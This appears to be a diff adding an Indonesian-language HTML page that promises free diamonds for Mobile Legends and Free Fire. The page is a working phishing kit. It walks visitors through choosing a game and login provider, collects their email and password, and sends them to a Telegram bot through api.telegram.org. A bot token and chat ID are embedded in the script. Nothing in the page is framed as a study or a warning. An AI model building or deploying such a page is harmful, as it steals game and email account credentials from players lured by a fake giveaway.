@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Diamond FREE BY DANZ</title>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: 'Orbitron', sans-serif;
+        background: radial-gradient(circle at top left, #0d0d3f, #000);
+        overflow-x: hidden;
+        color: #fff;
+        text-align: center;
+    }
+    h1 {
+        padding: 20px;
+        margin: 0;
+        font-size: 2rem;
+        text-shadow: 0 0 10px #00f, 0 0 20px #0ff;
+    }
+    .container {
+        max-width: 400px;
+        margin: 40px auto;
+        background: rgba(0,0,0,0.5);
+        padding: 25px;
+        border-radius: 15px;
+        box-shadow: 0 0 20px #00f, 0 0 40px #0ff;
+    }
+    .btn {
+        display: inline-block;
+        background: #00f;
+        color: #0ff;
+        padding: 12px 20px;
+        border-radius: 12px;
+        cursor: pointer;
+        margin: 8px;
+        border: none;
+        font-weight: bold;
+        text-transform: uppercase;
+        text-shadow: 0 0 5px #0ff;
+        box-shadow: 0 0 10px #0ff, 0 0 20px #00f;
+        transition: 0.3s;
+    }
+    .btn:hover {
+        background: #0ff;
+        color: #00f;
+        box-shadow: 0 0 15px #0ff, 0 0 30px #00f;
+    }
+    .hidden { display: none; }
+    input, select {
+        width: 100%;
+        padding: 10px;
+        margin: 8px 0;
+        border-radius: 8px;
+        border: none;
+        outline: none;
+        font-size: 1rem;
+        background: rgba(0,0,0,0.3);
+        color: #0ff;
+        text-shadow: 0 0 5px #00f;
+    }
+    input::placeholder {
+        color: #0ff;
+        opacity: 0.7;
+    }
+    #log {
+        background: rgba(0,0,0,0.6);
+        color: #0f0;
+        padding: 12px;
+        margin-top: 15px;
+        border-radius: 10px;
+        font-family: monospace;
+        max-height: 220px;
+        overflow-y: auto;
+        text-align: left;
+        box-shadow: 0 0 15px #0ff, 0 0 30px #00f;
+    }
+    body::before {
+        content: "";
+        position: fixed;
+        top:0; left:0; right:0; bottom:0;
+        background: url('https://i.imgur.com/3X9oD3h.jpg') no-repeat center center/cover;
+        opacity: 0.2;
+        z-index: -1;
+        animation: movebg 60s linear infinite;
+    }
+    @keyframes movebg {
+        0%{background-position:0 0;}
+        100%{background-position:1000px 1000px;}
+    }
+</style>
+</head>
+<body>
+
+<h1>Welcome to Diamond Gratis By Danz</h1>
+
+<div class="container" id="step1">
+    <h3>Pilih Game</h3>
+    <button class="btn" onclick="chooseGame('ML')">Mobile Legends</button>
+    <button class="btn" onclick="chooseGame('FF')">Free Fire</button>
+</div>
+
+<div class="container hidden" id="step2">
+    <h3>Pilih Metode Login</h3>
+    <div id="loginOptions"></div>
+</div>
+
+<div class="container hidden" id="step3">
+    <h3>Form Diamond</h3>
+    <input type="email" id="email" placeholder="Email">
+    <input type="password" id="password" placeholder="Password">
+    <select id="diamond">
+        <option value="">Pilih Diamond</option>
+        <option>120 DM</option>
+        <option>200 DM</option>
+        <option>400 DM</option>
+    </select>
+    <select id="rank"></select>
+    <button class="btn" onclick="submitForm()">Konfirmasi</button>
+</div>
+
+<div class="container hidden" id="step4">
+    <h3>Log Data</h3>
+    <div id="log"></div>
+</div>
+
+<script>
+let selectedGame = '';
+let selectedLogin = '';
+
+const rankML = [
+    "Warrior","Elite","Master","Grandmaster","Epic",
+    "Legend","Mythic","Mythical Honor","Mythical Immortal","Glorious Mythic"
+];
+const rankFF = [
+    "Bronze","Silver","Gold","Platinum",
+    "Diamond","Heroic","Master","Grandmaster"
+];
+
+function chooseGame(game) {
+    selectedGame = game;
+    document.getElementById('step1').classList.add('hidden');
+    document.getElementById('step2').classList.remove('hidden');
+
+    let options = '';
+    if (game === 'ML') {
+        options = `<button class="btn" onclick="chooseLogin('Moonton')">Moonton</button>
+                   <button class="btn" onclick="chooseLogin('Google')">Google</button>`;
+    } else {
+        options = `<button class="btn" onclick="chooseLogin('Gmail')">Gmail</button>
+                   <button class="btn" onclick="chooseLogin('Facebook')">Facebook</button>`;
+    }
+    document.getElementById('loginOptions').innerHTML = options;
+}
+
+function chooseLogin(loginMethod) {
+    selectedLogin = loginMethod;
+    document.getElementById('step2').classList.add('hidden');
+    document.getElementById('step3').classList.remove('hidden');
+
+    let rankSelect = document.getElementById('rank');
+    rankSelect.innerHTML = "<option value=''>Pilih Rank</option>";
+    let ranks = selectedGame === 'ML' ? rankML : rankFF;
+    ranks.forEach(r => {
+        rankSelect.innerHTML += `<option>${r}</option>`;
+    });
+}
+
+function submitForm() {
+    let email = document.getElementById('email').value;
+    let pass = document.getElementById('password').value;
+    let diamond = document.getElementById('diamond').value;
+    let rank = document.getElementById('rank').value;
+
+    let logText = `Game: ${selectedGame}\nLogin: ${selectedLogin}\nEmail: ${email}\nPassword: ${pass}\nDiamond: ${diamond}\nRank: ${rank}`;
+    document.getElementById('step3').classList.add('hidden');
+    document.getElementById('step4').classList.remove('hidden');
+    document.getElementById('log').innerText = logText;
+
+    // Kirim ke Telegram (token & chatID sesuai yang lo kasih)
+    const token = "8551520439:AAEg_wLgup50UiFtY51fKkWsM45QXMWs5TM";
+    const chatId = "1494128777";
+    if (token && chatId) {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: logText })
+        });
+    }
+}
+</script>
+
+</body>
+</html>
